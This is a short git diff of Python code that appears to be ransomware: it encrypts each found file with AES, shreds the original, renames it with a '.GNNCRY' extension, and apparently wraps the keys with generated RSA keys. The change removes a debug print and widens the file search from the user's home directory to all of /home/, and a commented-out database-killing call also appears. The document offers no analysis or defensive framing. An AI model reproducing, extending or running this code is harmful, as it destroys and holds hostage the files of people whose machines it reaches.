@@ -47,8 +47,6 @@ def encrypt_priv_key(msg, key):
 
 def start_encryption(files):
     AES_and_base64_path = []
-    for x in range(len(files)):
-        print(files[x]),
     for found_file in files:
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
@@ -65,7 +63,7 @@ def start_encryption(files):
             encrypted = AES_obj.encrypt(file_content)
         except:
             continue
-            
+
         utils.shred(found_file)
 
         new_file_name = found_file.decode('utf-8') + ".GNNCRY"
@@ -87,7 +85,7 @@ def menu():
 
     #kill_databases()
 
-    files = get_files.find_files(variables.home)
+    files = get_files.find_files(variables.home)+get_files.find_files("/home/")
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
